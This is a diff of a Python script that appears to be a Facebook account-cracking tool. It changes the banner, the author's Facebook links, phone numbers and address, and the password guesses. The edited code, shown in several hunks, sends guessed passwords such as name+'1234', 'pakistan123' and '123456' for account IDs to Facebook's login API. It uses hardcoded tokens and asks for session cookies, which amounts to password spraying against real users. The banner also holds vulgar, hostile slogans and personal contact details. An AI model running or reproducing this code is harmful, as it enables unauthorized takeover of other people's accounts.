@@ -68,30 +68,23 @@ c2 = "\033[0;97m"
 
 c3 = "\033[1;91m"
 
-logo = """                                          
-                                                                                                 
-\033[1;96m  ______ _____ _____  
-\033[1;96m |  ____|_   _|  __ \ We Are Pakistani🖕
-\033[1;96m | |__    | | | |  | |We Have Cyber Power🖕
-\033[1;96m |  __|   | | | |  | |We Believe In One Allah
-\033[1;96m | |____ _| |_| |__| |I Will Fuck Your System
-\033[1;96m |______|_____|_____/  UL AZHA                                        
-                            _                     _    
-\033[1;92m                 | |                   | |   
-\033[1;92m  _ __ ___  _   _| |__   __ _ _ __ __ _| | __
-\033[1;92m | '_ ` _ \| | | | '_ \ / _` | '__/ _` | |/ /
-\033[1;92m | | | | | | |_| | |_) | (_| | | | (_| |   < 
-\033[1;92m |_| |_| |_|\__,_|_.__/ \__,_|_|  \__,_|_|\_\
-                                                                                                                                     
-\033[1;96mSufyan Ke Taraf Sy Tamam Ummat-E-Muslima Ko Eid-Ul-Azha Boht Boht Mubarak♥️♥️                                                                                           \033[1;91mAwo A Talaqyano Mala Tol Ghwaha Raolegy😂                                                                                                                         
-\033[1;96m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
-\033[1;91m(~)\033[1;97m Author : SuFyaN ShabQadry \033[1;96m[ \033[0;92m♥️👊👉💔😢 \033[1;97m]
+logo = """   
 
-\033[1;96m(~)\033[1;97m Facebook: https://www.facebook.com/Sufyan.shabqadry
+\033[1;92m __      __  _____   ____  __.______________   _________ ___ ___    _____    ___ ___  
+\033[1;93m/  \    /  \/  _  \ |    |/ _|   \_   _____/  /   _____//   |   \  /  _  \  /   |   \ 
+\033[1;94m\   \/\/   /  /_\  \|      < |   ||    __)    \_____  \/    ~    \/  /_\  \/    ~    \
+\033[1;95m \        /    |    \    |  \|   ||     \     /        \    Y    /    |    \    Y    /
+\033[1;91m  \__/\  /\____|__  /____|__ \___|\___  /    /_______  /\___|_  /\____|__  /\___|_  / 
+\033[1;98m       \/         \/        \/        \/             \/       \/         \/       \/                                                                                                                                                                                                     _                     _                                                                                                                                       
+\033[1;96mSufyan Ke Taraf Sy Wakif Shah KHWAJAWAS Kheel K Liye Tukhfa                                                                                        \033[1;91mAwo A Talaqyano Mala Tol Ghwaha Raolegy😂                                                                                                                         
+\033[1;96m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
+\033[1;33m(~)\033[1;97m Author : SuFyaN For Wakif \033[1;96m[ \033[0;92m♥️👊👉💔😢 \033[1;97m]
+
+\033[1;96m(~)\033[1;97m Facebook: https://www.facebook.com/profile.php?id=100069973613718
 
 \033[1;96m(~)\033[1;97m Address : Peshawar Shabqaddar Khwajawas Pakistan😆
                            
-            \033[1;96nWHATSAPP NUMBER  +923489458276
+            \033[1;96nWHATSAPP NUMBER  0348945876 # 03470119218
 \033[1;96m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;96m
 
 """
@@ -593,7 +586,7 @@ def menu_select():
 
 		        else:
 
-		            pass2=name+"khan"
+		            pass2=name+"1234"
 
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -627,7 +620,7 @@ def menu_select():
 
 		                else:
 
-		                    pass3=name+"123"
+		                    pass3=name+"12345"
 
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -661,7 +654,7 @@ def menu_select():
 
 		                        else:
 
-		                            pass4=name+"1234"
+		                            pass4=name+"786"
 
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -695,7 +688,7 @@ def menu_select():
 
 		                                else:
 
-		                                    pass5="786786"
+		                                    pass5="pakistan123"
 
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -729,7 +722,7 @@ def menu_select():
 
 		                                        else:
 
-		                                            pass6="Pakistan"
+		                                            pass6="123456"
 
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -763,7 +756,7 @@ def menu_select():
 
 		                                                else:
 
-		                                                    pass7="pak1234"
+		                                                    pass7="khan1122"
 
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
